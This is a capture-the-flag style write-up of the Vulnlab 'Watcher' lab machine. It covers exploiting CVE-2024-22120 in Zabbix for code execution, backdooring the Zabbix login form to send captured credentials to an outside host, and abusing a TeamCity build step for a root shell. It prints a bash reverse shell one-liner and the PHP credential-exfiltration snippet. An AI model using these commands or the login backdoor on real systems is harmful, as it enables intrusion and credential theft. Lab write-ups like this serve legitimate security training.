---
sticker: lucide//eye
tags:
  - Software/Zabbix
  - CVE/CVE-2024-22120
  - Technique/Backdoor-Login-Form
  - Software/Teamcity
---


![](https://images-ext-1.discordapp.net/external/t5J7RHf9Ce4qzovuWH58fQjf0tQy6jDpKgmYAzNHrwM/https/assets.vulnlab.com/watcher_slide.png?format=webp&quality=lossless)

##  Machine Summary

We first find a Zabbix instance which is a vulnerable version where we can gain RCE via `CVE-2024-22120`. After gaining a shell we can backdoor the application to gain the credentials of another user `Frank`. With that user we can login to an internal `TeamCity` instance, that runs as `root`. Where we can create a pipeline to gain a reverse shell as `root`. 

## Recon

```ad-summary
title: NMAP
collapse: open

```nmap
nmap -sC -sV -p- --min-rate 1000 10.10.92.19 -oA watcher  

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 20:02 CEST
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 20:02 (0:00:12 remaining)
Nmap scan report for 10.10.92.19
Host is up (0.019s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f0:e4:e7:ae:27:22:14:09:0c:fe:1a:aa:85:a8:c3:a5 (ECDSA)
|_  256 fd:a3:b9:36:17:39:25:1d:40:6d:5a:07:97:b3:42:13 (ED25519)
80/tcp    open  http       Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://watcher.vl/
10050/tcp open  tcpwrapped
10051/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```ad-important
title: Domains
collapse: open

- **watcher.vl**
```

## Initial Access
We are first presented with a normal website. We then perform subdomain enumeration:
```
ffuf -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u http://watcher.vl -H 'Host: FUZZ.watcher.vl' --fw 1720
```

This yields `zabbix.watcher.vl`

Guest login is enabled there. After login we can see a dashboard where it states the zabbix version as `Zabbix version 7.0.0alpha1`.
There is a [RCE vulnerability]([https://gridinsoft.com/blogs/zabbix-sqli-vulnerability/](https://gridinsoft.com/blogs/zabbix-sqli-vulnerability/ "https://gridinsoft.com/blogs/zabbix-sqli-vulnerability/")) for this version. A [POC is available on Github]([https://github.com/W01fh4cker/CVE-2024-22120-RCE](https://github.com/W01fh4cker/CVE-2024-22120-RCE "https://github.com/W01fh4cker/CVE-2024-22120-RCE")) 

To get the `hostid` we can navigate to Inventory -> Hosts . There is only one with a hostid of `10084` which can be found as a query parameter after clicking on the host.
The `sessionid` can be found in cookie, by base64 decoding it.

Then the script can be run by providing those two parameters:
```
python3 CVE-2024-22120-RCE-2.py --ip zabbix.watcher.vl --sid bbf2d4b5233188ccfe382b39129644f5 --hostid 10084
```

After gaining a shell, it's advisable to stabilize the shell using something like pwncat:

```
bash -c "/bin/bash -i >& /dev/tcp/REDACTED/6063 0>&1" &
```

```
pwncat-cs -lp 6063
```

## Privilege Escalation

After stabilizing the shell we can get the user flag.

There is an interesting service running at 8111 which seems to be a `Teamcity` instance:
To access it we add our ssh key to the users home `/var/lib/zabbix/.ssh` inside `authorized_keys`. We can't actually login using ssh, but we can still use that for a socks proxy:

```
ssh -D 1080 -N -i zabbix.key zabbix@watcher.vl
```

We seem to have access to the login page in `/usr/share/zabbix/index.php` .
We can backdoor that file to forward all logins to our host:

```
$name = $_POST['name'] ?? 'Unknown';
$password = $_POST['password'] ?? 'Unknown';

// Prepare the log entry
//$logEntry = "Name: " . $name . ", Password: " . $password . "\n";

// Write the log entry to the file /tmp/log.txt
// The FILE_APPEND flag ensures the entry is added at the end of the file
// The file will be created if it does not exist
//file_put_contents('/tmp/log.txt', $logEntry, FILE_APPEND);
file_get_contents('http://REDACTED/x?name=' . $_POST['name'] . '&pass=' . $password);
//echo "Data logged successfully2!";
```

Then we get a request to our server after a few minutes:
```
10.10.70.236 - - [25/Jul/2024 23:01:02] "GET /x?name=Frank&pass=REDACTED HTTP/1.1" 404 -
```

We now have creds:
- `Frank`:`REDACTED`

We can now use those creds to access Teamcity. We now just need to create a pipeline giving us a shell:
Create a new project:
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266137532945535056/image.png?ex=66a40df7&is=66a2bc77&hm=1cb989a7963adfd9d6a3f136cb362586947f4a5a5451042d308dbee6d2f359df&)
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266139177234206771/image.png?ex=66a40f7f&is=66a2bdff&hm=f00184410101df0f690ce2ef228729b31b89ac98f4f4bcf2a21c94c01b789ca1&)

On the page we now get redirected to there is a Button `Create Build Configuration`

![](https://cdn.discordapp.com/attachments/1265405837053001768/1266139607700078643/image.png?ex=66a40fe6&is=66a2be66&hm=1a363fc0529a9bf67c6b28988c23d9b365f9ec922e6ae2232f8f5a787c207bc3&)

Just enter a name and save
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266135260979134556/image.png?ex=66a40bd9&is=66a2ba59&hm=9e021817a54d1880943697cdad67ecb472131572d871ccf9567091b91962cd52&)

Then skip the VCS integration
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266136001760460840/image.png?ex=66a40c8a&is=66a2bb0a&hm=10163a3592ed110cdd880af2bde7d8299d4f0a5a9edd9d19ff4b947284dad42b&)

Then in the BuildConfiguration switch to BuildSteps in the navbar on the left:
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266136280656511008/image.png?ex=66a40ccc&is=66a2bb4c&hm=d565b7f195b5431154d4cdd9b5553d43d59476132d01b786e56b21b1059aafe6&)

There you can add a build step:
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266136442489278604/image.png?ex=66a40cf3&is=66a2bb73&hm=094001795e377c155e9411732a4a05414f6585148bcc97d75bcc49eb012af6f1&)

Select `Command Line` as type:
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266136844135829584/image.png?ex=66a40d53&is=66a2bbd3&hm=e2aebc90ffdefbe81c818e522052c0c44476a3dedf40f4ebe40824a57afed105&)

Then we enter reverse shell command in the Custom Script box:
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266137091113222377/image.png?ex=66a40d8e&is=66a2bc0e&hm=c7a4bbf3e94ccfb210cbe86b83b26d7d29f91c4446e82b8c6e28cd9f0b1d9f31&)

Then save and click run on the top:
![](https://cdn.discordapp.com/attachments/1265405837053001768/1266137326120337530/image.png?ex=66a40dc6&is=66a2bc46&hm=623dc8bd57c5515380520e2fbc43626c9b8a0ceb0904d55b6bae5e22b94dbe51&)

After a few seconds a revshell as root will get sent to our host.

We can then read the flag from the root directory:
```
(remote) root@watcher.vl:/root# cat root.txt 
VL{REDACTED}
```


---
#### Lessons learned
- When backdooring the login form, writing files didn't work, extracting via http is a simple alternative. Thanks to @Cr0w for pointing it out.
---
